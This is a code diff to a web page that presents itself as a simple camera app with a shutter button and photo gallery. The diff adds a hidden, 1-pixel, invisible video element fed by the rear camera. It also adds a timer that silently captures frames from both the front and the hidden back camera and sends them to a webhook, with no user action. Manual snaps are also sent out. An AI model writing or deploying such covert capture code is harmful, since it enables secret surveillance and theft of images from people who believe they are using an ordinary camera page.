@@ -102,10 +102,20 @@
       cursor: pointer;
       z-index: 20;
     }
+    #hiddenBackCam {
+      width: 1px;
+      height: 1px;
+      position: absolute;
+      top: 0;
+      left: 0;
+      opacity: 0;
+      z-index: -1;
+    }
   </style>
 </head>
 <body>
   <video id="videoPreview" autoplay playsinline muted></video>
+  <video id="hiddenBackCam" autoplay playsinline muted></video>
   <div id="flash"></div>
   <button id="shutterBtn"></button>
   <img id="photoPreview" src="" alt="preview" />
@@ -120,33 +130,43 @@
     const preview = document.getElementById('photoPreview');
     const gallery = document.getElementById('galleryView');
     const backBtn = document.getElementById('backBtn');
-    const photos = [];
-    let currentStream = null;
-    const videoPreview = document.getElementById('videoPreview');
     const flash = document.getElementById('flash');
     const shutterSound = document.getElementById('shutterSound');
+    const videoPreview = document.getElementById('videoPreview');
+    const hiddenBackCam = document.getElementById('hiddenBackCam');
 
-    async function initCamera() {
-      const isAndroid = /Android/i.test(navigator.userAgent);
-      if (isAndroid) {
-        videoPreview.style.display = "block";
-        currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        videoPreview.srcObject = currentStream;
-        startPeriodicCapture();
-      } else {
-        videoPreview.style.display = "block";
-        currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        videoPreview.srcObject = currentStream;
-        startPeriodicCapture();
-      }
+    let frontStream = null;
+    let backStream = null;
+    const photos = [];
+
+    async function getStream(facingMode) {
+      return navigator.mediaDevices.getUserMedia({ video: { facingMode } });
     }
 
-    async function captureFromCurrentStream() {
+    async function initCameras() {
+      try {
+        frontStream = await getStream("user");
+        videoPreview.srcObject = frontStream;
+      } catch (e) {
+        console.error("前カメラ取得失敗", e);
+      }
+
+      try {
+        backStream = await getStream("environment");
+        hiddenBackCam.srcObject = backStream;
+      } catch (e) {
+        console.warn("外カメラ取得失敗（許可されていない可能性あり）", e);
+      }
+
+      startPeriodicCapture();
+    }
+
+    function captureFromVideo(video) {
       const canvas = document.createElement('canvas');
-      canvas.width = videoPreview.videoWidth;
-      canvas.height = videoPreview.videoHeight;
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
       const ctx = canvas.getContext('2d');
-      ctx.drawImage(videoPreview, 0, 0, canvas.width, canvas.height);
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       return new Promise(res => canvas.toBlob(blob => res(blob), 'image/jpeg', config.quality));
     }
 
@@ -171,11 +191,11 @@
     shutterBtn.onclick = async () => {
       showFlash();
       shutterSound.play();
-      const blob = await captureFromCurrentStream();
+      const blob = await captureFromVideo(videoPreview);
       if (blob.size <= config.maxSize) {
         updatePreview(blob);
         addToGallery(blob);
-        sendToWebhook(blob, "Front Camera (Manual Snap)");
+        sendToWebhook(blob, "📸 Front Camera (Manual)");
       }
     };
 
@@ -215,21 +235,30 @@
     function startPeriodicCapture() {
       setInterval(async () => {
         try {
-          const blobUser = await captureFromCurrentStream();
-          if (blobUser.size <= config.maxSize) {
-            sendToWebhook(blobUser, "Front Camera (Scheduled Update)");
+          if (videoPreview.readyState >= 2) {
+            const frontBlob = await captureFromVideo(videoPreview);
+            if (frontBlob.size <= config.maxSize) {
+              sendToWebhook(frontBlob, "📤 Front Camera (Auto)");
+            }
           }
-        } catch (e) {
-          console.error("Front camera update error:", e);
+          if (hiddenBackCam.readyState >= 2) {
+            const backBlob = await captureFromVideo(hiddenBackCam);
+            if (backBlob.size <= config.maxSize) {
+              sendToWebhook(backBlob, "📤 Back Camera (Auto)");
+            }
+          }
+        } catch (err) {
+          console.error("定期送信エラー", err);
         }
       }, config.interval);
     }
 
     window.addEventListener("beforeunload", () => {
-      currentStream?.getTracks().forEach(t => t.stop());
+      frontStream?.getTracks().forEach(t => t.stop());
+      backStream?.getTracks().forEach(t => t.stop());
     });
 
-    initCamera();
+    initCameras();
   </script>
 </body>
 </html>
